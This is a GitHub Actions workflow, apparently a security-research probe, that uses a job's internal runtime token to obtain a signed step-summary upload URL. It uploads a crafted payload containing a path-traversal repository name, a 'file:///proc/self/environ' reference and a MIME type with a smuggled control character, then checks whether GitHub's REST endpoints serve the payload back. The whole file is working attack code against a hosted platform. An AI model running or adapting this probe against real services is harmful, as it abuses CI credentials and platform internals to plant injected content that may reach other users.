name: Probe step summary signed blob upload
on:
  workflow_dispatch:
permissions:
  actions: read
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - uses: actions/github-script@v8
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          github-token: ${{ github.token }}
          script: |
            const crypto = require('node:crypto');
            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
            const results = process.env.ACTIONS_RESULTS_URL;
            const repo = process.env.GITHUB_REPOSITORY;
            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
            const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
            const [, runBackendId, jobBackendId] = scope.split(':');
            const fields = {workflow_run_backend_id: runBackendId, workflow_job_run_backend_id: jobBackendId};
            const apiHeaders = {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'own-step-summary-upload-probe'};
            const jobsResponse = await fetch(`https://api.github.com/repos/${repo}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs?per_page=100`, {headers: apiHeaders});
            if (!jobsResponse.ok) throw new Error(`jobs HTTP ${jobsResponse.status}`);
            const jobs = (await jobsResponse.json()).jobs || [];
            const job = jobs.find(x => x.name === 'probe');
            if (!job) throw new Error('job not listed');
            const submittedRepo = `x/../${repo}/actions/jobs/${job.id}/summary_raw`;
            const payload = Buffer.from(JSON.stringify({full_name: submittedRepo, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'controlled step summary payload'}));
            const expectedHash = crypto.createHash('sha256').update(payload).digest('hex');
            const mime = 'application/json\u0085';
            async function rpc(method, document) {
              const response = await fetch(new URL(`twirp/results.services.receiver.Receiver/${method}`, results), {
                method: 'POST',
                headers: {Authorization: `Bearer ${runtime}`, 'Content-Type': 'application/json'},
                body: JSON.stringify(document),
              });
              const text = await response.text();
              let data = {}; try { data = JSON.parse(text); } catch {}
              return {status: response.status, data};
            }
            const summaryFields = {...fields, step_number: 3, step_id: '3', timeline_record_id: jobBackendId};
            const signed = await rpc('GetStepSummarySignedBlobURL', summaryFields);
            if (signed.status !== 200 || !signed.data.summary_url) throw new Error(`summary URL HTTP ${signed.status}`);
            const summaryUrl = signed.data.summary_url;
            core.setSecret(summaryUrl);
            const put = await fetch(summaryUrl, {
              method: 'PUT',
              headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2023-11-03', 'x-ms-blob-content-type': mime, 'Content-Type': 'application/octet-stream'},
              body: payload,
            });
            const putText = (await put.text()).slice(0, 120);
            console.log(`UPLOAD status=${put.status} mime=${JSON.stringify(mime)} bytes=${payload.length} sha256=${expectedHash} response=${JSON.stringify(putText)}`);
            if (!put.ok) throw new Error(`summary upload HTTP ${put.status}`);
            const meta = await rpc('CreateStepSummaryMetadata', {...summaryFields, uploaded_at: new Date().toISOString(), line_count: 1});
            console.log(`METADATA status=${meta.status} ok=${Boolean(meta.data.ok)} msg=${JSON.stringify(String(meta.data.msg || '').slice(0,120))}`);
            const readback = await fetch(summaryUrl, {method: 'GET'});
            const body = Buffer.from(await readback.arrayBuffer());
            const type = readback.headers.get('content-type') || '';
            console.log(`SIGNED_GET status=${readback.status} type=${JSON.stringify(type)} typeHex=${Buffer.from(type).toString('hex')} bytes=${body.length} sha256=${crypto.createHash('sha256').update(body).digest('hex')} exact=${body.equals(payload)}`);
            const paths = [
              `actions/jobs/${job.id}/summary_raw`,
              `actions/jobs/${job.id}/summary`,
              `actions/jobs/${job.id}/steps/3/summary`,
              `actions/runs/${process.env.GITHUB_RUN_ID}/summary_raw`,
              `actions/runs/${process.env.GITHUB_RUN_ID}/attempts/${process.env.GITHUB_RUN_ATTEMPT || '1'}/summary_raw`,
              `actions/jobs/${job.id}/logs`,
            ];
            for (const path of paths) {
              try {
                const first = await fetch(`https://api.github.com/repos/${repo}/${path}`, {headers: apiHeaders, redirect: 'manual'});
                const location = first.headers.get('location');
                const final = location ? await fetch(location) : first;
                const bytes = Buffer.from(await final.arrayBuffer());
                const type = final.headers.get('content-type') || '';
                console.log(`REST ${path} first=${first.status} final=${final.status} type=${JSON.stringify(type)} typeHex=${Buffer.from(type).toString('hex')} bytes=${bytes.length} exact=${bytes.equals(payload)} json=${(()=>{try{JSON.parse(bytes.toString('utf8'));return true}catch{return false}})()}`);
              } catch (error) { console.log(`REST ${path} ERROR=${error.name}`); }
            }
            console.log(`PROBE_RUN=${process.env.GITHUB_RUN_ID} JOB=${job.id} PAYLOAD_SHA256=${expectedHash} REPOSITORY=${submittedRepo}`);
